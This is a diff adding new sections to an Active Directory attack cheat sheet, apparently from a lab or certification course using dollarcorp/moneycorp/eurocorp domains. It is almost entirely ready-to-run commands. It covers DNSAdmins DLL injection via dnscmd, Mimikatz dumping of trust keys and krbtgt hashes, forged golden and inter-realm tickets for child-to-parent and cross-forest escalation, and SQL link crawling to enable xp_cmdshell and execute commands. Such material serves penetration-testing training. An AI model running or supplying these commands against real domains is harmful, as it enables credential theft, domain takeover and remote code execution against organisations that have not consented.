@@ -32,8 +32,14 @@
    * [Set SPN](#Set-SPN) 
    * [Unconstrained Delegation](#Unconstrained-delegation) 
    * [Constrained Delegation](#Constrained-delegation) 
-      
-
+   * [DNS Admins](#DNS-Admins) 
+   * [Enterprise Admins](#Enterprise-Admins) 
+      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
+      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
+   * [Crossforest attacks](#Crossforest-attacks)
+      * [Trust flow](#Trust-flow) 
+      * [Trust abuse](#Trust-abuse) 
+   
 # General
 #### Access C disk of a computer (check local admin)
 ```
@@ -877,4 +883,146 @@ Tgs::s4u /tgt:<kirbi file> /user:Administrator@dollarcorp.moneycorp.local /servi
 ```
 Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+## DNS Admins
+#### Enumerate member of the DNS admin group
+```
+Get-NetGRoupMember “DNSAdmins”
+```
+
+#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
+Share the directory the ddl is in for everyone so its accessible.
+logs all DNS queries on C:\Windows\System32\kiwidns.log 
+```
+Dnscmd dcorp-dc /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
+```
+
+#### Restart DNS
+```
+Sc \\dcorp-dc stop dns
+Sc \\dcorp-dc start dns
+```
+
+## Enterprise Admins
+### Child to parent - trust tickets
+#### Dump trust keys
+Look for in trust key from child to parent (first command)
+Look for NTLM hash (second command)
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+```
+
+#### Create an inter-realm TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<hash> /target:moneycorp.local /ticket:<path to save ticket>"'
+```
+
+#### Create a TGS for a service (kekeo_old)
+```
+./asktgs.exe <kirbi file> CIFS/mcorp-dc.moneycorp.local
+```
+
+#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
+```
+./kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+```
+
+#### Check access to server
+```
+Ls \\mcorp-dc.moneycorp.local\c$ 
+```
+
+### Child to parent - krbtgt hash
+#### Get krbtgt hash from dc
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+```
+
+#### Create TGT
+the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
+```
+
+#### Inject the ticket
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
+```
+
+#### Get SID of enterprise admin
+```
+Get-NetGroup -Domain moneycorp.local -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
+```
+
+## Crossforest attacks
+### Trust flow
+#### Dump trust keys
+Look for in trust key from child to parent (first command)
+Look for NTLM hash (second command)
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+```
+
+#### Create a intern-forest TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:eurocorp.local /ticket:<path to save ticket>"'
+```
+
+#### Create a TGS for a service (kekeo_old)
+```
+./asktgs.exe <kirbi file> CIFS/eurocorp-dc.eurocorp.local
+```
+
+#### Use the TGT
+```
+./kirbikator.exe lsa <kirbi file>
+```
+
+#### Check access to server
+```
+Ls \\eurocorp-dc.eurocorp.local\forestshare\
+```
+
+### Trust abuse
+```
+. .\PowerUpSQL.ps1
+```
+
+#### Discovery SPN scanning
+```
+Get-SQLInstanceDomain
+```
+
+#### Check accessibility
+```
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
+```
+
+#### Gather information
+```
+Get-SQLInstanceDomain | Get SQLServerInfo -Verbose
+```
+
+#### Search for links to remote servers
+```
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+```
+
+#### Enumerate database links
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+```
+
+#### Enable xp_cmdshell
+```
+Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “eu-sql”
+```
+
+#### Execute commands
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
 ```
